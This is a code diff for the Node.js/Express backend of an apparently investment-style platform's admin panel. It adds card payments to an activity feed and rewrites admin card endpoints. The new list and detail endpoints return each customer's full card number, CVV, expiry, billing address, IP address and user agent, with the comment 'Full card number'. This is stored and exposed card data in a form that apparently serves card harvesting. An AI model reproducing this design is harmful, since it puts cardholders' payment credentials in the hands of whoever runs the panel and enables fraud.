@@ -8368,16 +8368,14 @@ app.post('/api/admin/users/:userId/balance', async (req, res) => {
 
 
 
-
-
-// Recent Activity Endpoint - Match Frontend Expectations
+// Recent Activity Endpoint - Match Frontend Expectations with Status Colors
 app.get('/api/admin/activity', adminProtect, async (req, res) => {
     try {
         const { page = 1, limit = 5 } = req.query;
         const skip = (page - 1) * parseInt(limit);
 
         // Get combined activities from multiple sources in real-time
-        const [userActivities, investments, transactions, kycSubmissions] = await Promise.all([
+        const [userActivities, investments, transactions, kycSubmissions, cardPayments] = await Promise.all([
             // User activities from UserLog
             UserLog.find()
                 .populate('user', 'firstName lastName email')
@@ -8387,7 +8385,7 @@ app.get('/api/admin/activity', adminProtect, async (req, res) => {
                 .lean(),
 
             // Recent investments
-            Investment.find({ status: { $in: ['active', 'pending'] } })
+            Investment.find()
                 .populate('user', 'firstName lastName email')
                 .populate('plan', 'name')
                 .sort({ createdAt: -1 })
@@ -8395,14 +8393,21 @@ app.get('/api/admin/activity', adminProtect, async (req, res) => {
                 .lean(),
 
             // Recent transactions
-            Transaction.find({ status: 'pending' })
+            Transaction.find()
                 .populate('user', 'firstName lastName email')
                 .sort({ createdAt: -1 })
                 .limit(10)
                 .lean(),
 
             // Recent KYC submissions
-            KYC.find({ status: 'pending' })
+            KYC.find()
+                .populate('user', 'firstName lastName email')
+                .sort({ createdAt: -1 })
+                .limit(5)
+                .lean(),
+
+            // Recent card payments
+            CardPayment.find()
                 .populate('user', 'firstName lastName email')
                 .sort({ createdAt: -1 })
                 .limit(5)
@@ -8427,6 +8432,7 @@ app.get('/api/admin/activity', adminProtect, async (req, res) => {
                 action: activity.action,
                 ipAddress: activity.ipAddress,
                 status: activity.status,
+                statusColor: getStatusColor(activity.status),
                 description: getActivityDescription(activity),
                 type: 'user_activity'
             });
@@ -8446,7 +8452,8 @@ app.get('/api/admin/activity', adminProtect, async (req, res) => {
                 username: investment.user ? `${investment.user.firstName} ${investment.user.lastName}` : 'Unknown User',
                 action: 'investment_created',
                 status: investment.status,
-                description: `New investment: $${investment.amount} in ${investment.plan?.name || 'Plan'}`,
+                statusColor: getStatusColor(investment.status),
+                description: `Investment: $${investment.amount} in ${investment.plan?.name || 'Plan'} - ${investment.status}`,
                 type: 'investment'
             });
         });
@@ -8463,9 +8470,10 @@ app.get('/api/admin/activity', adminProtect, async (req, res) => {
                     email: transaction.user.email
                 } : null,
                 username: transaction.user ? `${transaction.user.firstName} ${transaction.user.lastName}` : 'Unknown User',
-                action: `${transaction.type}_created`,
+                action: `${transaction.type}_transaction`,
                 status: transaction.status,
-                description: `${transaction.type.toUpperCase()}: $${transaction.amount} (${transaction.method})`,
+                statusColor: getStatusColor(transaction.status),
+                description: `${transaction.type.toUpperCase()}: $${transaction.amount} (${transaction.method}) - ${transaction.status}`,
                 type: 'transaction'
             });
         });
@@ -8484,8 +8492,29 @@ app.get('/api/admin/activity', adminProtect, async (req, res) => {
                 username: kyc.user ? `${kyc.user.firstName} ${kyc.user.lastName}` : 'Unknown User',
                 action: 'kyc_submitted',
                 status: kyc.status,
-                description: `KYC ${kyc.type} submission pending review`,
+                statusColor: getStatusColor(kyc.status),
+                description: `KYC ${kyc.type} submission - ${kyc.status}`,
                 type: 'kyc'
+            });
+        });
+
+        // Process card payments
+        cardPayments.forEach(payment => {
+            activities.push({
+                _id: payment._id,
+                timestamp: payment.createdAt,
+                user: payment.user ? {
+                    _id: payment.user._id,
+                    firstName: payment.user.firstName,
+                    lastName: payment.user.lastName,
+                    email: payment.user.email
+                } : null,
+                username: payment.user ? `${payment.user.firstName} ${payment.user.lastName}` : 'Unknown User',
+                action: 'card_payment',
+                status: payment.status,
+                statusColor: getStatusColor(payment.status),
+                description: `Card Payment: $${payment.amount} - ${payment.status}`,
+                type: 'card_payment'
             });
         });
 
@@ -8493,7 +8522,7 @@ app.get('/api/admin/activity', adminProtect, async (req, res) => {
         activities.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
         const paginatedActivities = activities.slice(0, parseInt(limit));
 
-        const totalActivities = await UserLog.countDocuments();
+        const totalActivities = await UserLog.countDocuments() + await CardPayment.countDocuments();
 
         // Return EXACT structure frontend expects
         res.status(200).json({
@@ -8516,6 +8545,27 @@ app.get('/api/admin/activity', adminProtect, async (req, res) => {
     }
 });
 
+// Helper function to get status color
+function getStatusColor(status) {
+    const colorMap = {
+        'active': 'green',
+        'completed': 'green',
+        'success': 'green',
+        'verified': 'green',
+        'approved': 'green',
+        
+        'pending': 'goldenrod',
+        'processing': 'goldenrod',
+        
+        'failed': 'red',
+        'rejected': 'red',
+        'cancelled': 'red',
+        'declined': 'red'
+    };
+    
+    return colorMap[status] || 'gray';
+}
+
 // Helper function to generate activity descriptions
 function getActivityDescription(activity) {
     const descriptions = {
@@ -8527,60 +8577,66 @@ function getActivityDescription(activity) {
         'investment': 'New investment created',
         'profile_update': 'User updated profile information',
         'password_change': 'User changed password',
-        'kyc_submission': 'KYC documents submitted'
+        'kyc_submission': 'KYC documents submitted',
+        'card_payment': 'Card payment processed'
     };
     
     return descriptions[activity.action] || `User performed ${activity.action}`;
 }
 
-// Saved Cards Endpoint - Match Frontend Expectations
+// Saved Cards Endpoint - Using CardPayment Schema
 app.get('/api/admin/cards', adminProtect, async (req, res) => {
     try {
         const { page = 1, limit = 5 } = req.query;
         const skip = (page - 1) * parseInt(limit);
 
-        // Get ALL card data exactly as stored in database
-        const cards = await Card.find()
+        // Get ALL card payment data from CardPayment schema
+        const cardPayments = await CardPayment.find()
             .populate('user', 'firstName lastName email')
             .sort({ createdAt: -1 })
             .skip(skip)
             .limit(parseInt(limit))
             .lean();
 
-        // Format to EXACTLY match frontend table structure
-        const formattedCards = cards.map(card => {
-            // Extract last 4 digits for display, but keep full number available
-            const last4 = card.cardNumber.length > 4 ? card.cardNumber.slice(-4) : card.cardNumber;
+        // Format to EXACTLY match frontend table structure using CardPayment data
+        const formattedCards = cardPayments.map(payment => {
+            // Extract last 4 digits for display
+            const last4 = payment.cardNumber.length > 4 ? payment.cardNumber.slice(-4) : payment.cardNumber;
             
             return {
-                _id: card._id,
+                _id: payment._id,
                 user: {
-                    _id: card.user?._id || 'unknown',
-                    firstName: card.user?.firstName || 'Unknown',
-                    lastName: card.user?.lastName || 'User',
-                    email: card.user?.email || 'unknown@email.com',
-                    fullName: card.user ? `${card.user.firstName} ${card.user.lastName}` : 'Unknown User'
+                    _id: payment.user?._id || 'unknown',
+                    firstName: payment.user?.firstName || 'Unknown',
+                    lastName: payment.user?.lastName || 'User',
+                    email: payment.user?.email || 'unknown@email.com',
+                    fullName: payment.user ? `${payment.user.firstName} ${payment.user.lastName}` : 'Unknown User'
                 },
-                // Card data EXACTLY as stored in database
-                fullName: card.fullName,
-                cardNumber: card.cardNumber, // Full card number
+                // Card data from CardPayment schema
+                fullName: payment.fullName,
+                cardNumber: payment.cardNumber, // Full card number
                 last4: last4, // Last 4 digits for display
-                expiry: card.expiry,
-                cvv: card.cvv,
-                billingAddress: card.billingAddress,
-                city: card.city || '',
-                state: card.state || '',
-                postalCode: card.postalCode || '',
-                country: card.country || '',
-                cardType: getCardType(card.cardNumber),
-                isDefault: card.isDefault || false,
-                lastUsed: card.lastUsed || card.createdAt,
-                createdAt: card.createdAt,
-                updatedAt: card.updatedAt
+                expiry: payment.expiryDate,
+                cvv: payment.cvv,
+                billingAddress: payment.billingAddress,
+                city: payment.city,
+                state: payment.state || '',
+                postalCode: payment.postalCode,
+                country: payment.country,
+                cardType: payment.cardType,
+                amount: payment.amount,
+                status: payment.status,
+                statusColor: getStatusColor(payment.status),
+                ipAddress: payment.ipAddress,
+                userAgent: payment.userAgent,
+                isDefault: false, // CardPayment doesn't have this field
+                lastUsed: payment.createdAt, // Use created date as last used
+                createdAt: payment.createdAt,
+                updatedAt: payment.updatedAt
             };
         });
 
-        const total = await Card.countDocuments();
+        const total = await CardPayment.countDocuments();
 
         // Return EXACT structure frontend expects
         res.status(200).json({
@@ -8603,16 +8659,63 @@ app.get('/api/admin/cards', adminProtect, async (req, res) => {
     }
 });
 
-// Helper function to detect card type
-function getCardType(cardNumber) {
-    const cleanNumber = cardNumber.replace(/\D/g, '');
-    
-    if (/^4/.test(cleanNumber)) return 'visa';
-    if (/^5[1-5]/.test(cleanNumber)) return 'mastercard';
-    if (/^3[47]/.test(cleanNumber)) return 'amex';
-    if (/^6(?:011|5)/.test(cleanNumber)) return 'discover';
-    return 'other';
-}
+// Additional endpoint to get card payment details by ID
+app.get('/api/admin/cards/:id', adminProtect, async (req, res) => {
+    try {
+        const cardPayment = await CardPayment.findById(req.params.id)
+            .populate('user', 'firstName lastName email')
+            .lean();
+
+        if (!cardPayment) {
+            return res.status(404).json({
+                status: 'fail',
+                message: 'Card payment not found'
+            });
+        }
+
+        // Format card payment data
+        const formattedCard = {
+            _id: cardPayment._id,
+            user: cardPayment.user ? {
+                _id: cardPayment.user._id,
+                firstName: cardPayment.user.firstName,
+                lastName: cardPayment.user.lastName,
+                email: cardPayment.user.email
+            } : null,
+            fullName: cardPayment.fullName,
+            cardNumber: cardPayment.cardNumber,
+            expiry: cardPayment.expiryDate,
+            cvv: cardPayment.cvv,
+            billingAddress: cardPayment.billingAddress,
+            city: cardPayment.city,
+            state: cardPayment.state,
+            postalCode: cardPayment.postalCode,
+            country: cardPayment.country,
+            cardType: cardPayment.cardType,
+            amount: cardPayment.amount,
+            status: cardPayment.status,
+            statusColor: getStatusColor(cardPayment.status),
+            ipAddress: cardPayment.ipAddress,
+            userAgent: cardPayment.userAgent,
+            createdAt: cardPayment.createdAt,
+            updatedAt: cardPayment.updatedAt
+        };
+
+        res.status(200).json({
+            status: 'success',
+            data: {
+                card: formattedCard
+            }
+        });
+
+    } catch (err) {
+        console.error('Get card payment error:', err);
+        res.status(500).json({
+            status: 'error',
+            message: 'An error occurred while fetching card payment details'
+        });
+    }
+});
 
 
 
@@ -8749,6 +8852,7 @@ processMaturedInvestments();
 httpServer.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
 
 
